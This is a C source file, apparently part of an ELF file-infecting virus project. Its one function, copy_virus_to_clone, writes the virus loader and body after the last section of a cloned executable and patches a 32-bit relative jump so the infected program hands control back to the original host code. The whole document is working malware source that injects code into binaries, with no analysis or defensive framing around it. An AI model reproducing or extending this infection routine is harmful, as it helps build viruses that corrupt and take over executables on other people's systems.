#include "virus.h"
#include "disasm.h"
#include "utils.h"
#include "jumps.h"
#include "compiler_utils.h"
#include "errors.h"

bool		copy_virus_to_clone(struct safe_ptr clone_ref,
			const struct entry *file_entry,
			const struct virus_header *vhdr)
{
	// copy loader and virus
	void	*loader_location = safe(clone_ref, file_entry->end_of_last_section, vhdr->full_virus_size);

	if (loader_location == NULL)
		return errors(ERR_VIRUS, _ERR_V_CANT_READ_FULL_VIRUS);

	memcpy(loader_location, vhdr->loader_entry, vhdr->full_virus_size);

	// gather offsets
	const size_t	shoff            = file_entry->safe_shdr->sh_offset;
	const size_t	loader_entry_off = file_entry->end_of_last_section;
	const size_t	client_entry_off = shoff + file_entry->offset_in_section;

	// compute distances
	const size_t	dist_jmpclient_loader_entry = loader_entry_off - client_entry_off;
	const size_t	dist_client_entry_jump      = dist_jmpclient_loader_entry + vhdr->dist_jmpclient_loader;

	// compute code offsets
	const size_t	client_jump_off = client_entry_off + dist_client_entry_jump;
	const int32_t	rel_jump_client = -((int32_t)dist_client_entry_jump + JUMP32_INST_SIZE);

	// get safe pointers in clone
	const void	*back_to_client_jump = safe(clone_ref, client_jump_off, INSTRUCTION_MAXLEN);

	// safe memory and overflow check
	if (back_to_client_jump == NULL
	|| dist_client_entry_jump < (size_t)((int32_t)dist_client_entry_jump))
		return errors(ERR_VIRUS, _ERR_V_COPY_VIRUS_TO_CLONE);

	// write new addr into clone's loader code
	const size_t	back_to_client_jump_offset = back_to_client_jump - clone_ref.ptr;

	write_jmp32(clone_ref, back_to_client_jump_offset, rel_jump_client);

	return true;
}
